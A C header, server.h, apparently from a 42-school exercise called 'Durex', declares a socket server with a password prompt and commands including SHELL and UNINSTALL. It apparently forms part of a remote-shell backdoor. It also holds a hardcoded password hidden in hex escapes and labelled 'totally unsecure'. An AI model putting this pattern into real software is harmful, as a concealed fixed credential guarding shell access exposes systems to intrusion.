/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:57:04 by banthony          #+#    #+#             */
/*   Updated: 2019/11/18 12:51:45 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef		SERVER_H
# define	SERVER_H

#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include "utils.h"
#include "libft.h"
#include "durex_log.h"

# define MAX_PENDING_CLIENT 3
# define READ_BUFFER_SIZE 4096

# define SERVER_STARTED "======== Server has started! ========"
# define SELECT_ERR "Server: select has failed."
# define ACCEPT_ERR "Server: accept has failed."
# define BIND_ERR "Server: bind has failed."
# define ALLOC_ERR(s) "An allocation has failed:" s
# define DISCONNECTED "Disconnected."
# define CLIENT_LOGIN "password requested."
# define CLIENT_LOG "connected and log."
# define CONNEXION_REFUSED "Connexion refused."

// Temporary const password (totally unsecure)
# define SERVER_PROMPT "Durex>"
# define PASS_REQUEST "\xe2\x98\x82  - Enter password:"
# define PASSWORD "\x34\x32\x34\x32\x0a"

typedef struct s_server
{
	int			port;
	int			socket;
	fd_set		fdset;
	size_t		client_limit;
	size_t		clients;
	t_list		*client_lst;
	t_bool		require_pass;
}				t_server;

typedef struct	s_client
{
	t_bool		granted;
	int			socket;
	char		*addr;
}				t_client;

typedef enum	e_server_cmd
{
 	HELP,
	HELP_ALIAS,
	UNINSTALL,
	SHELL,
	EXIT,
	SERVER_CMD_NUMBER,
}				t_server_cmd;

typedef t_bool	(*t_cmd_func)(t_client *cient, t_server *server);

typedef struct	s_cmd
{
	char		*name;
	t_cmd_func	func;
}				t_cmd;

void			send_text(char *text, int socket);
t_bool			new_client(t_server *server);
t_bool			deco_client(t_client *client, t_server *server);
t_bool			client_prefix(void *data, char (*prefix)[PREFIX_SIZE]);
void			server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client);
t_bool			create_server(t_server *server, int port, size_t client_limit);
t_bool			server_loop(t_server *server);

#endif
